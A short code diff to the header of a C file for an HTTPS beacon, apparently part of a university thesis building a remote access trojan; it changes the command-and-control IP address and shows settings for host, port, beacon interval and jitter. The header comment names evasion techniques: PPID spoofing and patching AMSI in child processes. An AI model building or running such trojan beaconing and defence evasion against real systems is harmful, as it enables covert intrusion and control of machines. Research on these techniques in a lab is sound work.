@@ -1,6 +1,6 @@
 /*
  * https_beacon.c — Beacon loop HTTPS verso il C2
- * WinHTTP HTTPS su 192.168.42.124:443, URI pool randomizzato,
+ * WinHTTP HTTPS su 192.168.122.47:443, URI pool randomizzato,
  * CWD persistente tra cicli, dispatch PS con PPID spoof + AMSI patch figlio.
  * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
  */
@@ -16,7 +16,7 @@
 #include <taskschd.h>
 #include <oleauto.h>
 
-#define C2_HOST          L"192.168.42.124"
+#define C2_HOST          L"192.168.122.47"
 #define C2_PORT          443
 #define BEACON_INTERVAL  60
 #define JITTER_PCT       30
